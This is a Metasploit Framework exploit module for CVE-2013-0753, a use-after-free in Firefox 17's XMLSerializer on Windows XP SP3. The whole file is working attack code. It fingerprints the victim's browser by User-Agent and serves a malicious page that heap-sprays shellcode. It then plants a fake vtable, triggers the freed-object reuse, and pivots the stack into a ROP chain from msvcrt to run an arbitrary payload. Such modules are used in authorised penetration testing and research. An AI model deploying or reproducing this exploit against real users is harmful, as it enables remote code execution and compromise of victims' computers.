# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Firefox XMLSerializer Use After Free&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found on Firefox 17.0 (< 17.0.2), specifically
        an use after free of an Element object, when using the serializeToStream method
        with a specially crafted OutputStream defining its own write function. This module
        has been tested successfully with Firefox 17.0.1 ESR, 17.0.1 and 17.0 on Windows XP
        SP3.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;regenrecht&#039;,  # Vulnerability Discovery, Analysis and PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-0753&#039; ],
          [ &#039;OSVDB&#039;, &#039;89021&#039;],
          [ &#039;BID&#039;, &#039;57209&#039;],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-13-006/&#039; ],
          [ &#039;URL&#039;, &#039;http://www.mozilla.org/security/announce/2013/mfsa2013-16.html&#039; ],
          [ &#039;URL&#039;, &#039;https://bugzilla.mozilla.org/show_bug.cgi?id=814001&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
          &#039;PrependMigrate&#039; => true
        },
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;    => "\x00",
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 30000 # Indeed a sprayed chunk, just a high value where any payload fits
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Firefox 17  / Windows XP SP3&#039;,
            {
              &#039;FakeObject&#039;   => 0x0c101008, # Pointer to the Sprayed Memory
              &#039;FakeVFTable&#039;  => 0x0c10100c, # Pointer to the Sprayed Memory
              &#039;RetGadget&#039;    => 0x77c3ee16, # ret from msvcrt
              &#039;PopRetGadget&#039; => 0x77c50d13, # pop # ret from msvcrt
              &#039;StackPivot&#039;   => 0x77c15ed5, # xcht eax,esp # ret msvcrt
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jan 08 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
  end
 
  def stack_pivot
    pivot = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    pivot << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    pivot << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    pivot << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
    return pivot
  end
 
  def junk(n=4)
    return rand_text_alpha(n).unpack("V").first
  end
 
  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    vprint_status("Agent: #{agent}")
 
    if agent !~ /Windows NT 5\.1/
      print_error("Windows XP not found, sending 404: #{agent}")
      send_not_found(cli)
      return
    end
 
    unless agent =~ /Firefox\/17/
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end
 
    # Fake object landed on 0x0c101008 if heap spray is working as expected
    code = [
      target[&#039;FakeVFTable&#039;],
      target[&#039;RetGadget&#039;],
      target[&#039;RetGadget&#039;],
      target[&#039;RetGadget&#039;],
      target[&#039;RetGadget&#039;],
      target[&#039;PopRetGadget&#039;],
      0x88888888, # In order to reach the call to the virtual function, according to the regenrecht&#039;s analysis
    ].pack("V*")
    code << [target[&#039;RetGadget&#039;]].pack("V") * 183 # Because you get control with "call dword ptr [eax+2F8h]", where eax => 0x0c10100c (fake vftable pointer)
    code << [target[&#039;PopRetGadget&#039;]].pack("V") # pop # ret
    code << [target[&#039;StackPivot&#039;]].pack("V") # stackpivot # xchg eax # esp # ret
    code << generate_rop_payload(&#039;msvcrt&#039;, stack_pivot + payload.encoded, {&#039;target&#039;=>&#039;xp&#039;})
 
    js_code = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))
    js_random = Rex::Text.to_unescape(rand_text_alpha(4), Rex::Arch.endian(target.arch))
    js_ptr = Rex::Text.to_unescape([target[&#039;FakeObject&#039;]].pack("V"), Rex::Arch.endian(target.arch))
 
    content = <<-HTML
<html>
<script>
var heap_chunks;
 
function heapSpray(shellcode, fillsled) {
  var chunk_size, headersize, fillsled_len, code;
  var i, codewithnum;
  chunk_size = 0x40000;
  headersize = 0x10;
  fillsled_len = chunk_size - (headersize + shellcode.length);
  while (fillsled.length <fillsled_len)
    fillsled += fillsled;
  fillsled = fillsled.substring(0, fillsled_len);
  code = shellcode + fillsled;
  heap_chunks = new Array();
  for (i = 0; i<1000; i++)
  {
    codewithnum = "HERE" + code;
    heap_chunks[i] = codewithnum.substring(0, codewithnum.length);
  }
}
 
function gen(len, pad) {
  pad = unescape(pad);
 
  while (pad.length < len/2)
    pad += pad;
 
  return pad.substring(0, len/2-1);
}
 
function run() {
  var container = [];
 
  var myshellcode = unescape("#{js_code}");
  var myfillsled = unescape("#{js_random}");
  heapSpray(myshellcode,myfillsled);
 
  var fake =
  "%u0000%u0000" +
  "%u0000%u0000" +
  "%u0000%u0000" +
  "%u0000%u0000" +
  "%u0000%u0000" +
  "%u0000%u0000" +
  "%u0000%u0000" +
  "#{js_ptr}";
 
  var small = gen(72, fake);
 
  var text = &#039;x&#039;;
  while (text.length <= 1024)
    text += text;
 
  var parent = document.createElement("parent");
  var child = document.createElement("child");
 
  parent.appendChild(child);
  child.setAttribute("foo", text);
 
  var s = new XMLSerializer();
  var stream = {
    write: function() {
      parent.removeChild(child);
      child = null;
      for (i = 0; i < 2097152; ++i)
        container.push(small.toLowerCase());
    }
  };
 
  s.serializeToStream(parent, stream, "UTF-8");
}
</script>
<body onload="run();">
</body>
</html>
    HTML
 
    print_status("URI #{request.uri} requested...")
    print_status("Sending HTML")
    send_response(cli, content, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
 
  end
 
end

